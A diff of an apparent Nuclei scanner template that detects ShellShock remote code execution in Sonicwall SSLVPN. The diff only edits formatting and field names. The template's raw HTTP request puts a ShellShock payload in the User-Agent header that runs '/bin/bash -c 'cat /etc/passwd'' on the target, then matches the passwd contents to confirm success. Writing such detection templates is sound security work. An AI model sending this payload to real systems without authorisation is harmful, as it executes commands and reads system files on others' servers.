@@ -1,5 +1,4 @@
 id: sonicwall-sslvpn-shellshock
-
 info:
   name: Sonicwall SSLVPN - Remote Code Execution (ShellShock)
   author: PR3R00T
@@ -14,24 +13,19 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: shellshock,sonicwall,rce,vpn
-  metadata:
-    max-request: 1
-
-http:
+requests:
   - raw:
       - |
         GET /cgi-bin/jarrewrite.sh HTTP/1.1
         Host: {{Hostname}}
         User-Agent: "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"
         Accept: */*
-
     matchers-condition: and
     matchers:
       - type: regex
         part: body
         regex:
           - "root:.*:0:0:"
-
       - type: status
         status:
           - 200
